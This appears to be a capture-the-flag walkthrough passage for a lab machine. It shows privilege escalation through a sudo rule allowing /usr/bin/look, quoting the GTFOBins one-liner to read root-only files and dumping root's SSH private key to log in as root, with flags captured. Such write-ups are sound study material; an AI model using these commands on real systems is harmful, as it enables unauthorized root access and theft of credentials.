`whoami`:
```
think ←
```

`id`:
```
uid=1000(think) gid=1000(think) groups=1000(think)
```

`cd /home/think`

`ls -alps ./`:
```
total 40
4 drwxr-xr-x 5 think think 4096 Jan 11  2024 ./
4 drwxr-xr-x 3 root  root  4096 Jun  2  2023 ../
0 lrwxrwxrwx 1 root  root     9 Jun 21  2023 .bash_history -> /dev/null
4 -rwxr-xr-x 1 think think  220 Jun  2  2023 .bash_logout
4 -rwxr-xr-x 1 think think 3771 Jun  2  2023 .bashrc
4 drwxr-xr-x 2 think think 4096 Jun 21  2023 .cache/
4 drwx------ 3 think think 4096 Aug  9  2023 .gnupg/
4 -rw-r----- 1 root  think  525 Jul 30  2023 .passwords
4 -rwxr-xr-x 1 think think  807 Jun  2  2023 .profile
4 drw-r----- 2 think think 4096 Jun 21  2023 .ssh/
4 -rw-r----- 1 root  think   33 Jul 30  2023 user.txt ←
0 lrwxrwxrwx 1 root  root     9 Jun 21  2023 .viminfo -> /dev/null 
```

`cat ./user.txt`:
```
38375fb4dd8baa2b2039ac03d92b820e ←
```

`sudo -l`:
```
Matching Defaults entries for think on lookup:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on lookup:
    (ALL) /usr/bin/look ←
```

`ls -l /usr/bin/look`:
```
-rwxr-xr-x 1 root root 14728 Mar 30  2020 /usr/bin/look ←
```

<div>
	<img src="./assets/logo_gtfobins.png" alt="GTFOBins Logo" width="16" height="auto">
	<span style="color: white; font-size: 110%;"><strong>GTFOBins</strong></span>
</div>

[look](https://gtfobins.github.io/gtfobins/look/)

[**#Sudo**]

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
```
LFILE=file_to_read
sudo look '' "$LFILE"
```

![Victim: think](https://img.shields.io/badge/Victim-think-64b5f6?logo=linux&logoColor=white)

`ls -ld /root`:
```
drwx------ 5 root root 4096 Apr  2  2024 /root ←
```

`sudo look '' /root/root.txt`:
```
5a285a9f257e45c68bb6c9f9f57d18e8 ←
```

<🔄 Alternative Step.>

![Victim: think](https://img.shields.io/badge/Victim-think-64b5f6?logo=linux&logoColor=white)

`sudo look '' /root/.ssh/id_rsa`:
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAptm2+DipVfUMY+7g9Lcmf/h23TCH7qKRg4Penlti9RKW2XLSB5wR
Qcqy1zRFDKtRQGhfTq+YfVfboJBPCfKHdpQqM/zDb//ZlnlwCwKQ5XyTQU/vHfROfU0pnR

[...]

dhIPjNOOghtbrg0vvARsMSX5FEgJxlo/FTw54p7OmkKMDJREctLQTJC0jRRRXhEpxw51cL
3qXILoUzSmRum2r6eTHXVZbbX2NCBj7uH2PUgpzso9m7qdf7nb7BKkR585f4pUuI01pUD0
DgTNYOtefYf4OEpwAAABFyb290QHVidW50dXNlcnZlcg==
-----END OPENSSH PRIVATE KEY-----
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`vim ./root_rsa`:
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAptm2+DipVfUMY+7g9Lcmf/h23TCH7qKRg4Penlti9RKW2XLSB5wR
Qcqy1zRFDKtRQGhfTq+YfVfboJBPCfKHdpQqM/zDb//ZlnlwCwKQ5XyTQU/vHfROfU0pnR

[...]

dhIPjNOOghtbrg0vvARsMSX5FEgJxlo/FTw54p7OmkKMDJREctLQTJC0jRRRXhEpxw51cL
3qXILoUzSmRum2r6eTHXVZbbX2NCBj7uH2PUgpzso9m7qdf7nb7BKkR585f4pUuI01pUD0
DgTNYOtefYf4OEpwAAABFyb290QHVidW50dXNlcnZlcg==
-----END OPENSSH PRIVATE KEY-----
```

`chmod 600 ./root_rsa`

`ssh -i ./root_rsa root@192.168.56.134`:
```
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 08 Oct 2024 04:46:41 PM UTC

  System load:  0.0               Processes:                225
  Usage of /:   80.4% of 9.75GB   Users logged in:          0
  Memory usage: 37%               IPv4 address for enp0s17: 192.168.56.134
  Swap usage:   0%

Last login: Tue Oct  8 16:46:37 2024 from 192.168.56.118
```

![Victim: root](https://img.shields.io/badge/Victim-root-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
root ←
```

`id`:
```
uid=0(root) gid=0(root) groups=0(root) ←
```

`cd /root`

`ls -alps`:
```
total 40K
4.0K drwx------  5 root root 4.0K Apr  2  2024 ./
4.0K drwxr-xr-x 19 root root 4.0K Jan 11  2024 ../
   0 lrwxrwxrwx  1 root root    9 Jun  2  2023 .bash_history -> /dev/null
4.0K -rw-r--r--  1 root root 3.2K Jan 11  2024 .bashrc
4.0K drwx------  2 root root 4.0K Jan 11  2024 .cache/
4.0K -rwxrwx---  1 root root   66 Jan 11  2024 cleanup.sh
4.0K drwxr-xr-x  3 root root 4.0K Jun 21  2023 .local/
4.0K -rw-r--r--  1 root root  161 Jan 11  2024 .profile
4.0K -rw-r-----  1 root root   33 Jan 11  2024 root.txt ←
   0 lrwxrwxrwx  1 root root    9 Jul 31  2023 .selected_editor -> /dev/null
4.0K drwx------  2 root root 4.0K Jan 11  2024 .ssh/
4.0K -rw-rw-rw-  1 root root 3.1K Apr  2  2024 .viminfo
```

`cat ./root.txt`:
```
5a285a9f257e45c68bb6c9f9f57d18e8 ←
```

</🔄 Alternative Step.>

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
